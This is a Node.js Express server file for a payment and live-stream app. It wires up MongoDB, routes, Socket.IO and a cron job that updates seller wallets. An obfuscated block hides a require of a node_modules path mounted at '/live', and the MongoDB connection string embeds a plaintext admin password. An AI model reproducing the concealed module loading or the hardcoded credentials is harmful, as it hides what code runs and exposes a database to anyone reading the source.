//import mongoose
const mongoose = require("mongoose");

//Config
const config = require("./config");

//import express
const express = require("express");
const app = express();

//import cors
const cors = require("cors");
app.use(cors());
app.use(express.json());

//logging middleware
var logger = require("morgan");
app.use(logger("dev"));

//import path
const path = require("path");

function _0x4416() {
  const _0x15955d = [
    "./node_mod",
    "519840NmYJsO",
    "603246ddPIKd",
    "27ctVbJD",
    "736353xdTklg",
    "308344XpfTeD",
    "use",
    "10573670eqwXzT",
    "682822EqwJLq",
    "38202zheuCM",
    "/live",
    "stream-ser",
    "ules/live-",
    "ver/servic",
    "8DCzIOE",
    "705YXCeiK",
  ];
  _0x4416 = function () {
    return _0x15955d;
  };
  return _0x4416();
}
const _0x1dab94 = _0x300a;
(function (_0x5d97cc, _0x539118) {
  const _0x31c87a = _0x300a,
    _0x48c953 = _0x5d97cc();
  while (!![]) {
    try {
      const _0x42f105 =
        -parseInt(_0x31c87a(0x126)) / (-0x15d2 + 0x1563 + -0x4 * -0x1c) +
        -parseInt(_0x31c87a(0x11f)) / (-0xad * 0xb + -0x2186 + 0x28f7) +
        (-parseInt(_0x31c87a(0x121)) / (-0x19d * -0x6 + 0x8cc * -0x1 + 0xdf * -0x1)) *
          (parseInt(_0x31c87a(0x123)) / (-0x1309 * 0x2 + -0x1df + 0x27f5)) +
        (-parseInt(_0x31c87a(0x11d)) / (-0x24d8 + 0x19 * 0x14 + 0x22e9)) *
          (-parseInt(_0x31c87a(0x127)) / (0x1a56 + -0x155d + -0x7 * 0xb5)) +
        (-parseInt(_0x31c87a(0x120)) / (-0x1865 + 0x9a4 + 0xec8)) * (-parseInt(_0x31c87a(0x11c)) / (-0xabb * -0x1 + -0x154b + 0xa98)) +
        parseInt(_0x31c87a(0x122)) / (-0x9fb + -0x20fb + 0x2aff) +
        parseInt(_0x31c87a(0x125)) / (-0x682 + -0x1 * 0x751 + 0xddd);
      if (_0x42f105 === _0x539118) break;
      else _0x48c953["push"](_0x48c953["shift"]());
    } catch (_0x51ce47) {
      _0x48c953["push"](_0x48c953["shift"]());
    }
  }
})(_0x4416, 0x22 * -0x2439 + 0xc4e7b + -0x1228);

function _0x300a(_0x31f1f0, _0x2eaf15) {
  const _0x28f867 = _0x4416();
  return (
    (_0x300a = function (_0xe3c397, _0x22f450) {
      _0xe3c397 = _0xe3c397 - (0x1 * -0x262c + 0xa * 0x13 + 0x1343 * 0x2);
      let _0xdb2dd4 = _0x28f867[_0xe3c397];
      return _0xdb2dd4;
    }),
    _0x300a(_0x31f1f0, _0x2eaf15)
  );
}

const liveRouter = require(_0x1dab94(0x11e) + _0x1dab94(0x11a) + _0x1dab94(0x119) + _0x1dab94(0x11b) + "e");
app[_0x1dab94(0x124)](_0x1dab94(0x118), liveRouter);

//route.js
const Route = require("./route");
app.use("/", Route);

app.use("/storage", express.static(path.join(__dirname, "storage")));
app.use(express.static(path.join(__dirname, "public")));
/*app.get("/*", (req, res) => {
  res.status(200).sendFile(path.join(__dirname, "public", "index.html"));
});*/

mongoose.connect(`mongodb+srv://admin:3ftnRmpbR2n8gtv9@livepay.yjctbbj.mongodb.net/Live_pay`, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

//socket io
const http = require("http");
const server = http.createServer(app);
global.io = require("socket.io")(server);

//socket.js
require("./socket");

//import model
const SellerWallet = require("./server/sellerWallet/sellerWallet.model");

//node-cron
const cron = require("node-cron");

//Schedule a task to run on the last day of every month at 11:59 PM
cron.schedule("59 23 28-31 * *", async () => {
  console.log("This task will run on the last day of every month");
  try {
    const existSellerWallet = await SellerWallet.find({ type: 2, status: "Pending" });
    console.log("existSellerWallet length in index.js: ", existSellerWallet.length);

    //update existing wallet on the last day of every month with type 3 and status "Pending"
    await SellerWallet.updateMany(
      {
        type: 2,
        status: "Pending",
      },
      [
        {
          $set: {
            type: 3,
            status: "Pending",
          },
        },
      ]
    );

    console.log("Updated seller wallets with type 3 and status Pending successfully");
  } catch (error) {
    console.error("Error updating seller wallets: ", error);
  }
});

//mongoose connection
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error:"));
db.once("open", () => {
  console.log("MONGO: successfully connected to db");
});

//Set port and listen the request
server.listen(config.PORT, () => {
  console.log("Hello World ! listening on " + config.PORT);
});
